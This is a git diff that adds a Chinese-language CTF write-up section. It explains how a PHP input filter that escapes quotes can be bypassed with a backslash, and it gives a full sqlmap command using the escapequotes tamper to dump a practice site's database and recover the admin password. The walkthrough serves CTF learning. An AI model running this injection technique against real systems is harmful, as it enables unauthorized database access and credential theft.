@@ -88,3 +88,47 @@ Payload:
 ## 17: scoreboard
 
 记分板页面隐藏着怎样的秘密？查看源代码，没有发现什么有用的东西。转向网络请求，发现返回头的 `x-flag` 参数就是我们要的 flag。
+
+## 18: login as admin 0
+
+这里我们仍然尝试使用 `sqlmap`，但如果直接调用 `sqlmap`，会发现没有办法注入。
+
+所以我们需要 tamper。`sqlmap` 内置的一些 tamper 可以在网络上查找到介绍，这里不再叙述。
+
+源代码中「过滤请求」的部分如下：
+
+```php
+function safe_filter($str)
+{
+    $strl = strtolower($str);
+    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
+        strstr($strl, 'update') || strstr($strl, 'delete')
+    ) {
+        return '';
+    }
+    return str_replace("'", "\\'", $str);
+}
+```
+
+可以注意到，虽然我们的请求字符串在转换为小写后中如果有 `or 1=1` 等字符串时整个请求会被清空，但是其他被直接过滤的字符串会改变数据库的内容，但我们的注入不会（也不应该）改变数据库。所以最关键的部分是第九行，将 `'` 替换为 `\'` 这**两个字符**（不是替换成 `\\'` 三个字符！可以在 PHP 的 REPL 里面亲自试一下。），即尝试转义请求字符串中的 `'`。
+
+但如果我们的输入是 `\'` 呢？在该函数过滤之后结果就是 `\\'`。可以发现，`\` 被转义了，但是 `'` 没有。
+
+查找资料可以发现，`sqlmap` 自带的 tamper `escapequotes.py` 可以像这样转义引号。该 tamper 的核心代码：
+
+```python
+return payload.replace("'", "\\'").replace('"', '\\"')
+```
+
+同样，它将 `sqlmap` 产生的 payload 进行处理，将 `'` 替换为 `\'` （**两个**字符），将 `"` 替换为 `\"`。
+
+所以照样用 `sqlmap`，加上 tamper 就可以了。
+
+Payload:
+
+```shell
+sqlmap -u "https://hackme.inndy.tw/login0/" --data="name=admin&password=bbb" --dbms=MySQL --tamper="escapequotes" -p password --dbs -D login_as_admin0 --columns --dump
+```
+
+获得 admin 密码，登录即可。
+
